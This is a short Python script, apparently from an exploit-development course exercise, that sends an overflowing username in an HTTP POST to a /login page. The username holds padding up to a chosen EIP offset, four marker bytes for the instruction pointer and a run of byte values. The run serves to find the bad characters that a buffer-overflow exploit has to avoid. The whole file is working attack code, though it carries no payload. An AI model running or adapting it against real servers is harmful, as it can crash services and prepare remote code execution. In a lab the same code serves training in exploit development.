#!/usr/bin/env python3

import socket
import sys
import subprocess

bad_char_values = [0x00, 0x0a, 0x0d, 0x25, 0x26, 0x2b, 0x3d]

if len(sys.argv) < 4:
    print("Usage: {} <IP> <PORT> <EIP_OFFSET>".format(sys.argv[0]))
    print("Finds bad characters from the web-based application in Chapter 3.")
    exit(1)

all_chars = b""
for i in range(0, 256):
    do_add = True
    for j in bad_char_values:
        if i == j:
            do_add = False
    if do_add:
        all_chars += i.to_bytes(1, "big")

try:
    server = sys.argv[1].encode()
    port = int(sys.argv[2])
    eip_offset = int(sys.argv[3])

    filler = b"A" * eip_offset
    eip = b"B" * 4

    inputBuffer = filler + eip + all_chars

    content = b"username=" + inputBuffer + b"&password=A"

    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://" + server + b"/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
